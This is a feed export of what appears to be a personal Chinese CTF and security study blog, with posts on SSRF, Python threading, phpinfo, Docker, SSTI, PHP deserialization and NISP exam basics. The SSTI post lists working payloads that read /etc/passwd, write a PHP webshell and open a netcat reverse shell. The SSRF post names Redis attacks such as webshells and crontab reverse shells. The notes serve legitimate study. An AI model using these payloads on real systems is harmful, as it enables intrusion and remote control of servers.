    <content type="html"><![CDATA[<p>SSRF服务器端伪造请求 学习记录</p><span id="more"></span><h1 id="SSRF-服务器端伪造请求"><a href="#SSRF-服务器端伪造请求" class="headerlink" title="SSRF-服务器端伪造请求"></a>SSRF-服务器端伪造请求</h1><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>SSRF(Server-Side Request Forgery)，服务器端请求伪造，利用漏洞伪造服务器端发起请求，从而突破客户端限制<br>通俗地来讲就是在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份向服务器所在内网发送一条信息<br>对外发起网络请求的地方都可能存在SSRF漏洞<br>一般用于外网探测或攻击内网服务</p><p><img src="/2022/03/15/ssrf/ssrf-0.png"></p><hr><h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><div class="hljs code-wrapper"><pre><code>1、可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息2、攻击运行在内网或本地的应用程序（比如溢出）3、对内网Web应用进行指纹识别，通过访问默认文件实现4、攻击内外网的Web应用，主要是使用Get参数就可以实现的攻击（比如Struts2漏洞利用，SQL注入等）5、利用file协议读取文件</code></pre></div><hr><h3 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h3><div class="hljs code-wrapper"><pre><code>1、过滤返回的信息，如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准2、统一错误信息，避免用户可以根据错误信息来判断远程服务器的端口状态3、限制请求的端口，比如80,443,8080,80904、禁止不常用的协议，仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp://等引起的问题5、使用DNS缓存或者Host白名单的方式</code></pre></div><hr><h3 id="常见情景"><a href="#常见情景" class="headerlink" title="常见情景"></a>常见情景</h3><div class="hljs code-wrapper"><pre><code>1、能够对外发起网络请求的地方，就可能存在 SSRF 漏洞2、从远程服务器请求资源（Upload from URL，Import &amp; Export RSS Feed）3、数据库内置功能（Oracle、MongoDB、MSSQL、Postgres、CouchDB）4、Webmail 收取其他邮箱邮件（POP3、IMAP、SMTP）5、文件处理、编码处理、属性信息处理（ffmpeg、ImageMagic、DOCX、PDF、XML）</code></pre></div><hr><h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><h5 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h5><p><img src="/2022/03/15/ssrf/ssrf-1.png"></p><p>后端实现：</p><div class="hljs code-wrapper"><pre><code>&lt;?php    $url = $_GET[&#39;opn&#39;];    $content = file_get_contents($url);    echo $content;?&gt;    </code></pre></div><h5 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen()"></a>fsockopen()</h5><p><img src="/2022/03/15/ssrf/ssrf-2.png"></p><p>后端实现：</p><h5 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a>curl_exec()</h5><p><img src="/2022/03/15/ssrf/ssrf-3.png"></p><p>后端实现：</p><hr><h3 id="协议利用"><a href="#协议利用" class="headerlink" title="协议利用"></a>协议利用</h3><h4 id="Gopher-协议"><a href="#Gopher-协议" class="headerlink" title="Gopher 协议"></a>Gopher 协议</h4><h5 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h5><p>gopher协议是一种信息查找系统，他将Internet上的文件组织成某种索引，方便用户从Internet的一处带到另一处  </p><p>Gopher 协议可以说是SSRF中的万金油。利用此协议可以攻击内网的 redis、ftp等等，也可以发送 GET、POST 请求。这无疑极大拓宽了 SSRF 的攻击面</p><h5 id="Gopher协议格式"><a href="#Gopher协议格式" class="headerlink" title="Gopher协议格式"></a>Gopher协议格式</h5><div class="hljs code-wrapper"><pre><code>URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</code></pre></div><ul><li>gopher的默认端口是6379  </li><li>如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&amp;也需要进行URL编码</li></ul><h5 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h5><p><img src="/2022/03/15/ssrf/gopher-1.png"></p><hr><h4 id="Dict-协议"><a href="#Dict-协议" class="headerlink" title="Dict 协议"></a>Dict 协议</h4><h5 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h5><p>Dict 协议是一个在线网络字典协议，这个协议是用来架设一个字典服务的</p><p>它的目标是超越Webster protocol，并允许客户端在使用过程中访问更多字典  </p><p>Dict服务器和客户机使用TCP端口2628</p><h5 id="Dict-语法"><a href="#Dict-语法" class="headerlink" title="Dict 语法"></a>Dict 语法</h5><div class="hljs code-wrapper"><pre><code>define [字典名] [单词]</code></pre></div><p>获取一个单词的解释</p><h5 id="Dict-利用"><a href="#Dict-利用" class="headerlink" title="Dict 利用"></a>Dict 利用</h5><div class="hljs code-wrapper"><pre><code>dict://serverip:port/命令</code></pre></div><p>参数向服务器的端口请求为【命令:参数】，并在末尾自动补上\r\n(CRLF)，为漏洞利用增添了便利通过dict协议的话要一条一条的执行，而gopher协议执行一条命令就行了</p><p><a href="https://www.cnblogs.com/Node-Sans-Blog/p/15118018.html">参考：Dict 协议是什么</a></p><p><a href="https://www.cnblogs.com/zzjdbk/p/12970919.html">参考—SSRF漏洞用到的其他协议（dict协议，file协议）</a></p><h4 id="File-协议"><a href="#File-协议" class="headerlink" title="File 协议"></a>File 协议</h4><p>file协议主要用于访问本地计算机中的文件</p><h6 id="File-利用"><a href="#File-利用" class="headerlink" title="File 利用"></a>File 利用</h6><p>file://文件路径</p><p>使用file协议可以直接读取目标操作系统的文件</p><h6 id="file协议和http协议有什么区别呢？"><a href="#file协议和http协议有什么区别呢？" class="headerlink" title="file协议和http协议有什么区别呢？"></a>file协议和http协议有什么区别呢？</h6><p>（1）file协议主要用于读取服务器本地文件，访问的是本地的静态资源<br>（2）http是访问本地的html文件，相当于把本机当作http服务器，通过http访问服务器，服务器再去访问本地资源。简单来说file只能静态读取，http可以动态解析<br>（3）http服务器可以开放端口，让他人通过http访问服务器资源，但file不可以<br>（4）file对应的类似http的协议是ftp协议（文件传输协议）<br>（5）file不能跨域  </p><p><a href="https://www.cnblogs.com/zzjdbk/p/12970919.html">参考—SSRF漏洞用到的其他协议（dict协议，file协议）</a></p><hr><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>redis常见的SSRF攻击方式大概有这几种：</p><p>1.绝对路径写webshell</p><p>2.写ssh公钥</p><p>3.写contrab计划任务反弹shell</p><hr><h3 id="SSRF攻击内网Redis服务"><a href="#SSRF攻击内网Redis服务" class="headerlink" title="SSRF攻击内网Redis服务"></a>SSRF攻击内网Redis服务</h3><p><a href="https://www.cnblogs.com/linuxsec/articles/11221756.html">浅析Redis中SSRF的利用</a></p><hr>]]></content>
    
    
    
    <tags>
      
      <tag>web ssrf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python-多线程的学习</title>
    <link href="/2022/03/13/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/03/13/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>Python-多线程的学习/总结</p><span id="more"></span><h1 id="Python-多线程的学习"><a href="#Python-多线程的学习" class="headerlink" title="Python-多线程的学习"></a>Python-多线程的学习</h1><p>简单学习一下多线程</p><h3 id="线程的概念"><a href="#线程的概念" class="headerlink" title="线程的概念"></a>线程的概念</h3><p>线程，有时被称为轻量级进程(Lightweight Process，LWP），是程序执行流的最小单元。一个标准的线程由线程ID，当前指令指针(PC），寄存器集合和堆栈组成。另外，线程是进程中的一个实体，是被系统独立调度和分派的基本单位，线程自己不拥有系统资源，只拥有一点儿在运行中必不可少的资源，但它可与同属一个进程的其它线程共享进程所拥有的全部资源。</p><h3 id="标准库—threading"><a href="#标准库—threading" class="headerlink" title="标准库—threading"></a>标准库—threading</h3><p>import threading</p><h3 id="Thread-对象"><a href="#Thread-对象" class="headerlink" title="Thread 对象"></a>Thread 对象</h3><div class="hljs code-wrapper"><pre><code>class threading.Thread(group=None, target=None, name=None, args=(), kwargs=&#123;&#125;, *, daemon=None)</code></pre></div><p>Thread 的构造方法中，最重要的参数是 target，所以我们需要将一个 callable 对象赋值给它，线程才能正常运行</p><p>callable 没有参数，如果需要传递参数的话，args 是固定参数，kwargs 是可变参数</p><p>如果要让一个 Thread 对象启动，调用它的 start() 方法就好了</p><div class="hljs code-wrapper"><pre><code>例def test():    .......thread = threading.Thread(target=test)thread.start()for i in range(5):    print(i)</code></pre></div><p>通过 thread.current_thread() 方法可以返回线程本身，然后就可以访问它的 name 属性</p><h5 id="Thread-的生命周期"><a href="#Thread-的生命周期" class="headerlink" title="Thread 的生命周期"></a>Thread 的生命周期</h5><p>1.创建对象时，代表 Thread 内部被初始化<br>2.调用 start() 方法后，thread 会开始运行<br>3.thread 代码正常运行结束或者是遇到异常，线程会终止  </p><p>可以通过 Thread 的 is_alive() 方法查询线程是否还在运行</p><p>值得注意的是，is_alive() 返回 True 的情况是 Thread 对象被正常初始化，start() 方法被调用，然后线程的代码还在正常运行</p><h5 id="join-提供线程阻塞手段"><a href="#join-提供线程阻塞手段" class="headerlink" title="join() 提供线程阻塞手段"></a>join() 提供线程阻塞手段</h5><p>调用一个 Thread 的 join() 方法，可以阻塞自身所在的线程</p><div class="hljs code-wrapper"><pre><code>def join(self, timeout=None):</code></pre></div><p>默认的情况是，join() 会一直等待对应线程的结束，但可以通过参数赋值，等待规定的时间就好了</p><p>timeout 是一个浮点参数，单位是秒</p><h3 id="例"><a href="#例" class="headerlink" title="例"></a>例</h3><p>[强网杯 2019]高明的黑客</p><div class="hljs code-wrapper"><pre><code>import osimport reimport timeimport requestsimport threadingdirr = &#39;&#39;files1 = os.listdir(dirr)                               # 获取文件夹下的文件files2 = os.listdir(dirr)                               # 获取文件夹下的反序文件files2.sort()files2.reverse()reg = re.compile(r&#39;(?&lt;=_GET\[\&#39;).*(?=\&#39;\])&#39;)            # 设置正则匹配def thread1(files, a):    for i in files:                                     # 循环文件        if a == 1:            print(&quot;1111111----------------------&quot;, i)        elif a == 2:            print(&quot;2222222----------------------&quot;, i)        url = &quot;&quot;                                          # url (docker适配的php版本)        f1 = open(dirr + i)                             # 打开这个文件        data = f1.read()                                # 读取文件内容        f1.close()                                      # 关闭文件        result = reg.findall(data)                      # 从文件内容中找到GET请求        for j in result:                                # 循环GET参数            payload = url + i + &quot;?&quot; + j + &quot;=echo+123456&quot;  # 尝试请求次路径，并执行命令            print(payload)            html = requests.get(payload)            if &quot;123456&quot; in html.text:                print(&quot;*****************************&quot;, payload)                exit(1)p1 = threading.Thread(target=thread1, args=(files1, 1))p2 = threading.Thread(target=thread1, args=(files2, 2))p1.start()p2.start()</code></pre></div><p><a href="https://cloud.tencent.com/developer/article/1566226">https://cloud.tencent.com/developer/article/1566226</a><br><a href="https://blog.csdn.net/kellyseeme/article/details/51473552">https://blog.csdn.net/kellyseeme/article/details/51473552</a><br><a href="https://www.cnblogs.com/fnng/p/3670789.html">https://www.cnblogs.com/fnng/p/3670789.html</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>phpinfo</title>
    <link href="/2022/03/04/phpinfo/"/>
    <url>/2022/03/04/phpinfo/</url>
    
    <content type="html"><![CDATA[<p>phpinfo相关分析</p><span id="more"></span><h1 id="phpinfo分析"><a href="#phpinfo分析" class="headerlink" title="phpinfo分析"></a>phpinfo分析</h1><h5 id="system-详细的操作系统信息，为提权做准备"><a href="#system-详细的操作系统信息，为提权做准备" class="headerlink" title="system  详细的操作系统信息，为提权做准备"></a>system  详细的操作系统信息，为提权做准备</h5><h5 id="short-open-tag-短标签-lt"><a href="#short-open-tag-短标签-lt" class="headerlink" title="short_open_tag  短标签(&lt;?)"></a>short_open_tag  短标签(&lt;?)</h5><h5 id="asp-tags-asp标签"><a href="#asp-tags-asp标签" class="headerlink" title="asp_tags  asp标签"></a>asp_tags  asp标签</h5><h5 id="disable-functions-禁用函数"><a href="#disable-functions-禁用函数" class="headerlink" title="disable_functions  禁用函数"></a>disable_functions  禁用函数</h5><h5 id="open-basedir-将用户可操作的文件限制在某目录下，用：分割多个"><a href="#open-basedir-将用户可操作的文件限制在某目录下，用：分割多个" class="headerlink" title="open_basedir  将用户可操作的文件限制在某目录下，用：分割多个"></a>open_basedir  将用户可操作的文件限制在某目录下，用：分割多个</h5><p>绕过方法：PHP原生类、</p><h5 id="SERVER-ADDR-真实IP"><a href="#SERVER-ADDR-真实IP" class="headerlink" title="SERVER_ADDR  真实IP"></a>SERVER_ADDR  真实IP</h5><h5 id="DOCUMENT-ROOT-web根目录"><a href="#DOCUMENT-ROOT-web根目录" class="headerlink" title="DOCUMENT_ROOT  web根目录"></a>DOCUMENT_ROOT  web根目录</h5><h5 id="upload-tmp-dir-临时文件存放的文件夹，但是文件名是随机的"><a href="#upload-tmp-dir-临时文件存放的文件夹，但是文件名是随机的" class="headerlink" title="upload_tmp_dir  临时文件存放的文件夹，但是文件名是随机的"></a>upload_tmp_dir  临时文件存放的文件夹，但是文件名是随机的</h5><h5 id="enable-dl"><a href="#enable-dl" class="headerlink" title="enable_dl"></a>enable_dl</h5><h5 id="FILES-“file1”-临时文件路径"><a href="#FILES-“file1”-临时文件路径" class="headerlink" title="_FILES[“file1”]  临时文件路径"></a>_FILES[“file1”]  临时文件路径</h5><p>向phpinfo()页面post一个shell（自己写一个上传页面），可以在_FILES[“file1”]中看到上传的临时文件，如果有个lfi，便可以直接getshell了</p><p><a href="https://www.cnblogs.com/xiaoqiyue/p/10158702.html">php文件包含漏洞（利用phpinfo）复现</a></p><h3 id="文件上传-文件包含"><a href="#文件上传-文件包含" class="headerlink" title="文件上传/文件包含"></a>文件上传/文件包含</h3><h4 id="PHP伪协议利用"><a href="#PHP伪协议利用" class="headerlink" title="PHP伪协议利用"></a>PHP伪协议利用</h4><h5 id="allow-url-fopen-on-允许使用file，fopen，file-get-contents打开远程url文件"><a href="#allow-url-fopen-on-允许使用file，fopen，file-get-contents打开远程url文件" class="headerlink" title="allow_url_fopen  on 允许使用file，fopen，file_get_contents打开远程url文件"></a>allow_url_fopen  on 允许使用file，fopen，file_get_contents打开远程url文件</h5><h5 id="allow-url-include-on-允许-include，include-once，require，-require-once远程文件"><a href="#allow-url-include-on-允许-include，include-once，require，-require-once远程文件" class="headerlink" title="allow_url_include  on 允许 include，include_once，require， require_once远程文件"></a>allow_url_include  on 允许 include，include_once，require， require_once远程文件</h5><h4 id="session"><a href="#session" class="headerlink" title="session"></a>session</h4><h5 id="session-save-path-session文件存储位置"><a href="#session-save-path-session文件存储位置" class="headerlink" title="session.save_path  session文件存储位置"></a>session.save_path  session文件存储位置</h5><h5 id="session-upload-progress-enabled-on-在文件上传过程中产生上传进度文件-当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息-如上传时间、上传进度等-存储在session当中"><a href="#session-upload-progress-enabled-on-在文件上传过程中产生上传进度文件-当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息-如上传时间、上传进度等-存储在session当中" class="headerlink" title="session.upload_progress.enabled  on  在文件上传过程中产生上传进度文件,当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中"></a>session.upload_progress.enabled  on  在文件上传过程中产生上传进度文件,当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中</h5><h5 id="session-upload-progress-cleanup-on-当文件上传结束后，php将会立即清空对应session文件中的内容"><a href="#session-upload-progress-cleanup-on-当文件上传结束后，php将会立即清空对应session文件中的内容" class="headerlink" title="session.upload_progress.cleanup  on  当文件上传结束后，php将会立即清空对应session文件中的内容"></a>session.upload_progress.cleanup  on  当文件上传结束后，php将会立即清空对应session文件中的内容</h5>]]></content>
    
    
    
    <tags>
      
      <tag>web PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker</title>
    <link href="/2022/02/28/Docker/"/>
    <url>/2022/02/28/Docker/</url>
    
    <content type="html"><![CDATA[<p>Docker</p><span id="more"></span><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><div class="hljs code-wrapper"><pre><code>docker search [keywords] 搜寻与keywords相关的镜像  docker images  查看本地的image镜像  docker pull [image] 拉取镜像docker run -d -p [host port]:[docker port] [image] 新建一个docker容器，并映射端口号docker ps -a 查看运行中的docker容器docker exec -it [container id] bash 进入一个docker容器docker cp [本地路径] [container id]:[container 路径] 拷贝本地文件到dockerdocker start [container id] 启动一个docker容器docker stop [container id] 停止一个docker容器docker rm [container id] 删除一个docker容器(需要先停止容器才能删除容器)docker rmi [image id] 删除一个docker镜像(需要删除镜像对应的容器才能删除镜像)</code></pre></div><h3 id="相关实例"><a href="#相关实例" class="headerlink" title="相关实例"></a>相关实例</h3><h4 id="nginx-php"><a href="#nginx-php" class="headerlink" title="nginx + php"></a>nginx + php</h4><p>1.下载/拉取相关镜像</p><div class="hljs code-wrapper"><pre><code>docker pull pmconnect/php-nginx</code></pre></div><p>2.本地测试题目和镜像</p><p>运行镜像</p><div class="hljs code-wrapper"><pre><code>docker run -id --name [容器名] -p [端口号]:80 镜像名</code></pre></div><p>进入容器 </p><div class="hljs code-wrapper"><pre><code>docker exec -it [容器名] /bin/bash</code></pre></div><p>linux编写文件</p><div class="hljs code-wrapper"><pre><code>打开终端，输入vi test.txt 回车，按a或i进入编辑模式，输入 I am a boy，然后按esc键退出编辑模式，输入:wq保存并退出</code></pre></div><p>linux改权限</p><div class="hljs code-wrapper"><pre><code>chmod 777 /var/www/html</code></pre></div><p>docker copy文件</p><div class="hljs code-wrapper"><pre><code>docker cp C:/Users/OPN/Desktop/wth/nginx.conf 84f4cc85ae11:/etc/nginx/nginx.conf</code></pre></div><p>3.编写dockerfile</p><div class="hljs code-wrapper"><pre><code>FROM php:7.4-apacheRUN rm -rf /var/wwww/html/*  \&amp;&amp; chmod 740 /var/www/htmlCOPY WWW/* /var/www/html/EXPOSE 80</code></pre></div><p>运行dockerfile创建镜像</p><div class="hljs code-wrapper"><pre><code>dockerfile 文件夹下docker build -t [镜像名] .</code></pre></div><p>4.编写docker-compose</p><div class="hljs code-wrapper"><pre><code>version: &#39;3&#39;services:    what_the_hell:                # 容器名称, 自行修改        build: .          # 构建路径, . 表示会在当前路径下找 Dockerfile 文件        ports:             - 10012:80     # 映射端口 虚拟机端口:容器内端口            </code></pre></div><p>5.运行docker-compose</p><div class="hljs code-wrapper"><pre><code>docker-compose up -d</code></pre></div>]]></content>
    
    
    
    <tags>
      
      <tag>Docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSTI模板注入</title>
    <link href="/2022/02/23/ssti/"/>
    <url>/2022/02/23/ssti/</url>
    
    <content type="html"><![CDATA[<p>ssti模板注入相关方法/解决问题</p><span id="more"></span><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>简单了解了一下ssti原理  </p><p><a href="https://www.jianshu.com/p/aef2ae0498df">SSTI链接</a>  </p><p><a href="https://jiang-niao.github.io/2020/04/02/SSTi%20%E5%85%A8%E8%A7%A3%E6%9E%90/#SSTi-%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%BE%85%E6%9B%B4%E6%96%B0%EF%BC%89">SSTi 学习</a>  </p><p><a href="https://www.anquanke.com/post/id/188172">SSTI/沙盒逃逸详细总结 </a>     </p><p>简单来说， 当用户的输入数据没有被合理的处理控制时，就有可能数据插入了程序段中变成了程序的一部分，从而改变了程序的执行逻辑</p><p>SSTI也是获取了一个输入，然后再后端的渲染处理上进行了语句的拼接，然后执行。当然还是和sql注入有所不同的，SSTI利用的是现在的网站模板引擎，主要针对python、php、java的一些网站处理框架，比如Python的jinja2 mako tornado django，php的smarty twig，java的jade velocity。当这些框架对运用渲染函数生成html的时候会出现SSTI的问题</p><h2 id="模板引擎"><a href="#模板引擎" class="headerlink" title="模板引擎"></a>模板引擎</h2><p>模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的HTML文档</p><p>模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这就大大提升了开发效率，良好的设计也使得代码重用变得更加容易</p><p>利用模板引擎来生成前端的html代码，模板引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模板+用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前</p><p>模板引擎也会提供沙箱机制来进行漏洞防范，但是可以用沙箱逃逸技术来进行绕过</p><h2 id="检测流程"><a href="#检测流程" class="headerlink" title="检测流程"></a>检测流程</h2><p><img src="/2022/02/23/ssti/ssti-1.png"></p><div class="hljs code-wrapper"><pre><code>首先输入&#123;&#123;7*7&#125;&#125;，返回值为49则表明存在SSTI输入&#123;&#123;system('cat /etc/passwd')&#125;&#125;如果返回值则表明为Smarty模板引擎输入&#123;&#123;7*'7'&#125;&#125;如果返回值是49则为Twig模板引擎如果返回值是7777777则为JinJa模板引擎</code></pre></div><h2 id="姿势总结"><a href="#姿势总结" class="headerlink" title="姿势总结"></a>姿势总结</h2><h3 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h3><p>payload:</p><div class="hljs code-wrapper"><pre><code>&#123;self::getStreamVariable(&quot;file:///etc/passwd&quot;)&#125;&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;&quot;,self::clearConfig())&#125;&#123;literal&#125;alert(&#39;xss&#39;);&#123;/literal&#125;&#123;if readfile(&#39;/flag&#39;)&#125;&#123;/if&#125;/////&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("cat /flag")&#125;&#125;</code></pre></div><h3 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a>Twig</h3><p>payload:</p><div class="hljs code-wrapper"><pre><code>&#123;self::getStreamVariable(&quot;file:///etc/passwd&quot;)&#125;&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;&quot;,self::clearConfig())&#125;&#123;literal&#125;alert(&#39;xss&#39;);&#123;/literal&#125;&#123;if readfile(&#39;/flag&#39;)&#125;&#123;/if&#125;</code></pre></div><h3 id="Django"><a href="#Django" class="headerlink" title="Django"></a>Django</h3><p>payload:</p><div class="hljs code-wrapper"><pre><code>&#123;user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;&#123;user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;</code></pre></div><h3 id="Jinja"><a href="#Jinja" class="headerlink" title="Jinja"></a>Jinja</h3><p>payload:</p><div class="hljs code-wrapper"><pre><code>&#123;&#123; ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evil', 'w').write('from os import system%0aSHELL = system') &#125;&#125;//写文件&#123;&#123; config.from_pyfile('/tmp/evil') &#125;&#125;//加载system&#123;&#123; config['SHELL']('nc xxxx xx -e /bin/sh') &#125;&#125;//执行命令反弹SHELL</code></pre></div><h3 id="Tornado"><a href="#Tornado" class="headerlink" title="Tornado"></a>Tornado</h3><p>payload:</p><div class="hljs code-wrapper"><pre><code>http://ip:port/opn90?msg=&#123;&#123;handler.settings&#125;&#125;</code></pre></div><p><a href="https://err0r.top/article/ssti/">附：https://err0r.top/article/ssti/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>web ssti</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Unserialize-ways</title>
    <link href="/2022/02/21/Unserialize-ways/"/>
    <url>/2022/02/21/Unserialize-ways/</url>
    
    <content type="html"><![CDATA[<p>PHP反序列化相关方法/解决方法问题</p><span id="more"></span><h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><h2 id="PHP常用魔术方法"><a href="#PHP常用魔术方法" class="headerlink" title="PHP常用魔术方法"></a>PHP常用魔术方法</h2><div class="hljs code-wrapper"><pre><code>__construct()，类的构造函数__destruct()，类的析构函数__call()，在对象中调用一个不可访问方法时调用__callStatic()，在静态上下文中调用一个不可访问方法时调用__get()，读取不可访问（protected或private）或不存在的属性的值时调用__set()，在给不可访问（protected或private）或不存在的属性赋值时调用__isset()，当对不可访问（protected或private）或不存在的属性调用isset()或empty()时调用__unset()，当对不可访问（protected或private）或不存在的属性调用unset()时调用__sleep()，执行serialize()时，先会调用这个函数__wakeup()，执行unserialize()时，先会调用这个函数__toString()，类被当成字符串时的回应方法__invoke()，调用函数的方式调用一个对象时的回应方法__set_state()，调用var_export()导出类时，此静态方法会被调用。__clone()，当对象复制完成时调用（可用于修改属性的值）__autoload()，尝试加载未定义的类__debugInfo()，打印所需调试信息</code></pre></div><h2 id="public、protected与private在序列化时的区别"><a href="#public、protected与private在序列化时的区别" class="headerlink" title="public、protected与private在序列化时的区别"></a>public、protected与private在序列化时的区别</h2><p>protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字段名前面会加上\0*\0的前缀。这里的 \0 表示 ASCII 码为 0 的字符(不可见字符)，而不是 \0 组合。这也许解释了，为什么如果直接在网址上，传递\0*\0username会报错，因为实际上并不是\0，只是用它来代替ASCII值为0的字符。必须用python传值才可以。</p><p>private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上\0的前缀。字符串长度也包括所加前缀的长度。其中 \0 字符也是计算长度的。</p><p>public无标记，变量名不变，长度不变<br>protected在字段名前添加标记\00*\00，长度+3<br>private在类名和字段名前添加标记\00(classname)\00，长度+2+类名长度</p><p><a href="https://opn90.top/2021/10/21/BUU/#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP">[极客大挑战 2019]PHP</a></p><h2 id="wakeup绕过方法"><a href="#wakeup绕过方法" class="headerlink" title="_wakeup绕过方法"></a>_wakeup绕过方法</h2><p>unserialize()会检查是否存在一个 __wakeup()方法。如果存在，则会先调用 __wakeup()方法，预先准备对象需要的资源  </p><p> <big> 序列化字符串中表示对象属性个数的值大于 真实的属性个数时会跳过__wakeup()的执行 </big> </p><p><a href="https://opn90.top/2021/10/21/BUU/#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP">[极客大挑战 2019]PHP</a></p><h2 id="POP链的原理-利用"><a href="#POP链的原理-利用" class="headerlink" title="POP链的原理/利用"></a>POP链的原理/利用</h2><p>POP面向属性编程</p><p>指从现有运行环境中寻找一系列的代码或指令调用，然后根据需求构造出一组连续的调用链</p><p>一般简单的反序列化都是魔法函数中出现的一些利用的漏洞，因为自动去调用魔法方法而产生漏洞，但如果关键代码不在魔术方法中，而在一个类的一个普通方法中，则需要通过寻找相同的函数名将类的属性和敏感函数连接起来</p>]]></content>
    
    
    
    <tags>
      
      <tag>web PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NISP</title>
    <link href="/2022/02/10/NISP/"/>
    <url>/2022/02/10/NISP/</url>
    
    <content type="html"><![CDATA[<p>国家信息安全水平考试 NISP 一级</p><span id="more"></span><hr><h1 id="国家信息安全水平考试-NISP-一级"><a href="#国家信息安全水平考试-NISP-一级" class="headerlink" title="国家信息安全水平考试 NISP 一级"></a>国家信息安全水平考试 NISP 一级</h1><p>（仅用于个人阶段性学习的文章，侵删）</p><h2 id="第一章-信息安全概述"><a href="#第一章-信息安全概述" class="headerlink" title="第一章 信息安全概述"></a>第一章 信息安全概述</h2><h3 id="1-1-信息与信息安全"><a href="#1-1-信息与信息安全" class="headerlink" title="1.1 信息与信息安全"></a>1.1 信息与信息安全</h3><h5 id="信息奠基人————香农"><a href="#信息奠基人————香农" class="headerlink" title="信息奠基人————香农"></a>信息奠基人————香农</h5><p>信息是用来消除随机不确定性的东西<br>信息是事物运动状态或存在方式的不确定性的描述<br>信息来源于物质，又不是物质本身;它从物质的运动中产生出来，又可以脱离源物质而寄生于媒体物质，相对独立地存在</p><h5 id="信息的定义"><a href="#信息的定义" class="headerlink" title="信息的定义"></a>信息的定义</h5><p>信息是有意义的数据，它具有一定价值，是一种需要适当保护的资产。<br>数据是反映客观事物属性的记录，是信息的具体表现形式。<br>数据经过加工处理之后，就成为信息;而信息需要经过数字化处理转变成数据才能存储和传输。</p><h5 id="信息的功能"><a href="#信息的功能" class="headerlink" title="信息的功能"></a>信息的功能</h5><p>反映事物内部属性、状态、结构、相互联系以及与外部环境的互动关系减少事物的不确定性</p><h5 id="信息的表达"><a href="#信息的表达" class="headerlink" title="信息的表达"></a>信息的表达</h5><p>信息本身是无形的，借助于信息媒体以多种形式存在或传播</p><h5 id="信息与消息"><a href="#信息与消息" class="headerlink" title="信息与消息"></a>信息与消息</h5><p>信息不同于消息，消息是信息的外壳，信息则是消息的内核，也可以说:消息是信息的笼统概念，信息则是消息的精确概念</p><h5 id="信息与数据"><a href="#信息与数据" class="headerlink" title="信息与数据"></a>信息与数据</h5><p>信息不同于数据，数据是信息的符号表示，或称载体;信息是数据的内涵，是数据的语义解释。<br>数据是信息存在的一种形式，只有通过解释或处理才能成为有用的信息。<br>数据可用不同的形式表示，而信息不会随数据不同的形式而改变</p><h5 id="信息技术"><a href="#信息技术" class="headerlink" title="信息技术"></a>信息技术</h5><p>用于管理和处理信息所采用的各种技术的总称  